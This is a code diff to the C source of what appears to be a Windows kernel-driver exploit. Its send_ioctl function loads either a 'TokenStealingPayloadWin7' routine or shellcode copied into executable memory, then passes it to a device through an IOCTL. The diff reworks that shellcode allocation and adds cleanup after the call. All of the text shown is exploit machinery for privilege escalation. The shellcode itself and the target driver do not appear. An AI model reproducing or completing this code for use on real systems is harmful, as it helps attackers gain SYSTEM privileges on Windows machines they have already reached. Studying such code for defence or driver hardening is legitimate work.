@@ -34,16 +34,19 @@ void close_device(HANDLE device)
 BOOL send_ioctl(HANDLE device, DWORD ioctl_code)
 {
     LPVOID payload_ptr = NULL;
-
+    
 #ifdef USE_INLINE
     printf("Using inline payload\n");
     payload_ptr = &TokenStealingPayloadWin7;
 #else
     printf("Using shellcode payload\n");
-    payload_ptr = VirtualAlloc(0, sizeof(kShellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (payload_ptr)
-        memcpy(payload_ptr, kShellcode, sizeof(kShellcode));
+    //allocate executable memory for the shellcode:
+    LPVOID shellc_ptr = VirtualAlloc(0, sizeof(kShellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (shellc_ptr)
+        memcpy(shellc_ptr, kShellcode, sizeof(kShellcode));
+    payload_ptr = shellc_ptr;
 #endif
+
     if (payload_ptr == NULL) {
         printf("[-] Payload cannot be NULL\n");
         return FALSE;
@@ -68,6 +71,15 @@ BOOL send_ioctl(HANDLE device, DWORD ioctl_code)
     );
     //release the input bufffer:
     HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
+
+#ifndef USE_INLINE
+    //release the memory with the shellcode:
+    if (shellc_ptr) {
+        VirtualFree(shellc_ptr, sizeof(kShellcode), MEM_RELEASE);
+        shellc_ptr = NULL;
+    }
+#endif
+
     return is_ok;
 }
 
